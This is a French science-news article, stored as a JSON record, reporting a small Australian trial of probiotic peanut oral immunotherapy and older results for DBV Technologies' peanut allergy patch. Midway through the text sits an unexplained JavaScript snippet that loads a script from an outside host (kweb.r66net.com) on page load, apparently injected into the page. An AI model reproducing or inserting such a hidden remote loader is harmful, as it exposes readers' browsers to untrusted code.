{"title": "Allergie aux arachides : un nouveau traitement semble efficace", "newspaper": "Futura Sciences", "author": "Marie-Céline Jacquier", "date_publi": "21/08/2017", "content": "Dans un petit essai clinique australien, la majorité des enfants traités pour une allergie aux arachides ont été guéris, avec une tolérance qui a duré pendant quatre années. Le traitement consistait à prendre oralement des probiotiques associés à de la protéine d'arachide. Ce qu'il faut retenir L'allergie aux arachides a tendance à persister à l'âge adulte et peut causer un choc anaphylactique fatal. Des chercheurs australiens proposent un traitement qui associe une bactérie lactique à des doses de protéine d'arachide. Quatre ans après le traitement, la majorité des enfants traités pouvaient manger des arachides normalement. Au cours des dernières décennies, la  fréquence  des allergies alimentaires est devenue croissante dans les pays occidentaux. Souvent, les allergies aux œufs, lait,  blé  et  soja  passent au cours de l'enfance ; mais les allergies aux fruits à coques et aux  poissons  et fruits de mer ont tendance à persister à l'âge adulte. Ces patients doivent éviter leur aliment interdit et savoir comment réagir en cas de réaction allergique. Cette vigilance de tous les instants a un impact sur la qualité de vie des enfants et de leurs familles. L' allergie  aux arachides est une des principales causes d'anaphylaxie, une réaction allergique potentiellement mortelle. Chaque année, environ 12 à 15 % des enfants souffrant de cette allergie seraient exposés accidentellement à l'arachide. Pour combattre cette allergie, des chercheurs ont mis au point un traitement appelé PPOIT (pour  probiotic and peanut oral immunotherapy ) qui combine des  probiotiques  à une  immunothérapie . Au lieu d'éviter l' allergène , le traitement consiste à reprogrammer la réponse du  système immunitaire  pour développer une tolérance aux cacahuètes. 48 enfants ont été recrutés par le  Murdoch Children’s Research Institute  pour ce petit  essai clinique . Ils ont reçu soit soit une combinaison d'une souche probiotique de  Lactobacillus rhamnosus  avec des quantités croissantes de  protéine  d'arachide (traitement PPOIT), soit un  placebo , et ce quotidiennement pendant 18 mois. À la fin de cet essai clinique, en 2013, 82 % des enfants qui avaient reçu le traitement étaient considérés comme tolérants aux cacahuètes, contre seulement 4 % du groupe placebo. La souche probiotique utilisée dans le traitement était une bactérie lactique  Lactobacillus rhamnosus . © Kateryna_Kon, Fotolia                               Les deux tiers des enfants traités ont été guéris de leur allergie L'objectif de cette recherche parue dans  Lancet Child & Adolescent Health  était surtout d'étudier les effets à long terme de ce traitement. Pendant les quatre années suivant le traitement, les réactions allergiques et la consommation d'arachides ont été enregistrées à l'aide de questionnaires. Les participants devaient aussi se soumettre à des tests  cutanés  d'allergie ( prick test ).   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Quatre ans plus tard, 67 % des enfants du groupe traité (16 sur 24) continuaient à manger des cacahuètes contre seulement 4 % du groupe placebo (1 sur 24). Quatre enfants traités et six du groupe placebo ont fait une réaction allergique après avoir ingéré de l'arachide de manière accidentelle ou intentionnelle, mais aucun n'a eu d'anaphylaxie. Les enfants traités avaient des marques plus petites lors des prick tests (8 mm de diamètre contre 13 mm dans le groupe placebo). Grâce au traitement, la vie des participants a changé : au départ, les enfants devaient éviter les arachides dans leur alimentation et être très vigilants, ce qui pouvait générer de l'anxiété ; à la fin du traitement et même quatre ans plus tard, beaucoup de ces enfants pouvaient désormais vivre normalement comme s'ils n'avaient pas d'allergie.  Si d'autres études plus vastes confirment ces résultats, ce traitement pourrait susciter beaucoup d'espoirs pour guérir des allergies alimentaires. Pour en savoir plus Allergie aux arachides : un patch s'annonce prometteur Article de  Marie-Céline Jacquier  paru le 8 mars 2017 Un patch développé par une société de  biotechnologie  française a obtenu des résultats encourageants, dans une étude présentée en congrès ce week-end à Atlanta. Les bénéfices doivent toutefois être relativisés en raison du faible nombre de participants. En France, l' allergie alimentaire  la plus fréquente chez l'enfant de moins d'un an est celle de l'œuf, puis viennent le lait et l'arachide. Celle au lait et aux œufs guérit fréquemment au fil du temps, contrairement à celle de l'arachide. Cette dernière est aussi très présente aux États-Unis, gros consommateur de cacahuètes. C'est pourquoi la société DBV Technologies a mis au point un patch pour lutter contre.  Le timbre épidermique proposé contient un extrait concentré de protéine d'arachide qui diffuse dans l' épiderme  pour désensibiliser le patient. Les résultats des essais cliniques réalisés sur ce patch ont été présentés ce week-end au congrès de l' American Academy of Allergy, Asthma and Immunology  à Atlanta (Géorgie). L'étude Vipes a tout d'abord cherché à déterminer le bon  dosage  pour le patch (50, 100 ou 250 µg). Il était appliqué pendant 24 h sur le bras des adultes et des adolescents, ou le  dos  des enfants (221 patients ont participé). Sur 12 mois, il y a eu 53,6 % de réponse au traitement chez les enfants de 6 à 11 ans, contre 19,4 % dans le groupe placebo. Ensuite, une seconde étude Olfus-Vipes a suivi les patients qui ont reçu le patch contenant la dose maximale de 250 µg. Elle comprenait 171 patients de l'étude Vipes, dont 18 enfants de 6 à 11 ans. L'entreprise a déclaré qu'aucun effet indésirable grave n'a été observé lors des trois années de l'étude Olfus-Vipes. Le traitement était bien suivi par les patients. Le  communiqué  annonce un taux de réponse de 83,3 % chez les enfants avec le patch à 250 µg. En France, l’allergie à l’œuf est la plus fréquente avant un an, mais elle a tendance à passer en grandissant. © valery121283, Fotolia                               D’autres allergies alimentaires visées À noter cependant que la rédaction de  France 5  s'est interrogée sur les chiffres exacts de ces travaux dans un article paru le 6 mars. La société a répondu en précisant que l'étude Olfus-Vipes comptait bien 171 patients, dont 97 enfants, parmi lesquels 18 avaient entre 6 et 11 ans. 15 enfants sur 18 (83,3 %) ont répondu au traitement. Le résultat, certes encourageant, portait donc sur un nombre réduit de patients.  Pour Pierre-Henri Behnamou, PDG de DBV Technologies, qui s'est expliqué à l'AFP :  « il s'agit du premier patch de désensibilisation et de  guérison  à une allergie alimentaire. Le but n'est pas de pouvoir manger un paquet de cacahuètes mais de réduire suffisamment la sensibilité pour éviter une réaction potentiellement mortelle en cas de consommation accidentelle d'arachide dans une sauce ou un plat ». Cette approche pourrait être utilisée à l'avenir pour d'autres allergies. D'après l'AFP, l'entreprise teste également un patch sur des enfants contre l'allergie aux produits laitiers et un nouveau patch contre l'allergène de l'œuf est en préparation.  Une autre solution pour limiter le risque d'allergie consiste à faire consommer très tôt ces aliments aux enfants. En janvier, l'Institut américain des allergies et des maladies infectieuses ( NIAID ) a suggéré de diminuer le risque d'allergie à l'arachide chez les nourrissons à risque en leur donnant dès quatre mois des aliments qui en contiennent. L’espoir d’un timbre contre l’allergie aux cacahuètes Article de Destination Santé paru le 8/10/2013 L'allergie à l'arachide, et donc aux cacahuètes, n'a rien d'anodin. C'est pourquoi la  FDA  américaine ( US Food and Drug Administration ) a accéléré le processus d'évaluation d'un patch élaboré par une société française visant à traiter cette affection. Une société française de biotechnologies,  DBV Technologies , a mis au point un  patch  qui pourrait améliorer la tolérance à l' arachide . Très prometteur, ce procédé dénommé Viaskin Peanut fait actuellement l'objet d'une nouvelle étude destinée à évaluer son efficacité à long terme. Ses résultats sont particulièrement attendus avant une mise sur le marché éventuelle, aux alentours de 2017-2018. L'idée du patch est de distiller à toutes petites doses l'allergène au patient et de réduire ainsi les risques de  choc anaphylactique , en cas d'exposition accidentelle. Ce produit prend la forme d'un patch  « qui permet d'administrer l' allergène  à travers la peau , explique Nathalie Donne, responsable de la communication de DBV Technologies.  De cette façon, il ne passe pas dans la circulation sanguine, ce qui évite les manifestations systémiques ». Essai clinique en cours pour traiter l’allergie aux cacahuètes Le traitement a obtenu un processus accéléré - appelé «  fast track  » - de la part la  Food and Drug Administration  ( FDA ) américaine. Cette procédure exceptionnelle est justifiée par le fait qu'il répond à un besoin médical non satisfait concernant une maladie grave. Comme pour aider au sevrage tabagique, d'ici quelques années, un patch pourrait devenir le premier traitement contre l'allergie à l'arachide. © RegBarc, Wikipédia, cc by sa 3.0                               La firme DBV Technologies vient de lancer une nouvelle étude à double insu (ou double anonymat), c'est-à-dire que les individus et les investigateurs de l'expérience eux-mêmes n'avaient pas connaissance du traitement reçu, pour supprimer tout jugement a priori. Ont pris part à l'étude 221 patients : 113 enfants (6 à 11 ans), 73 adolescents (12 à 17 ans) et 35 adultes (18 à 55 ans). Ce travail s'est déroulé dans cinq pays : le Canada, la France, les États-Unis, les Pays-Bas et la Pologne.  « L'objectif est désormais d'évaluer l'efficacité, l'innocuité et la tolérance à long terme de ce traitement. Pour enfin sortir les patients concernés du risque quotidien associé à   cette  allergie  »,  poursuit Nathalie Donne. Si ce travail est conduit à son terme, Viaskin Peanut pourrait arriver sur les marchés européens vers 2018. En attendant, si vous êtes concerné par cette allergie - responsable tout de même de 100 à 150 décès par an dans un pays comme les États-Unis -, remettez-vous-en à la stratégie habituelle. À savoir l'épluchage scrupuleux des...  étiquettes des aliments . L’urticaire : causes et traitements                       Maladie fréquente mais méconnue, l’urticaire touche 15 à 20 % de la population en France. Cette maladie qui n’est généralement pas liée à une allergie, peut être déclenchée par différents facteurs, dont le stress. Le point en vidéo.                                       ", "theme": "sante"}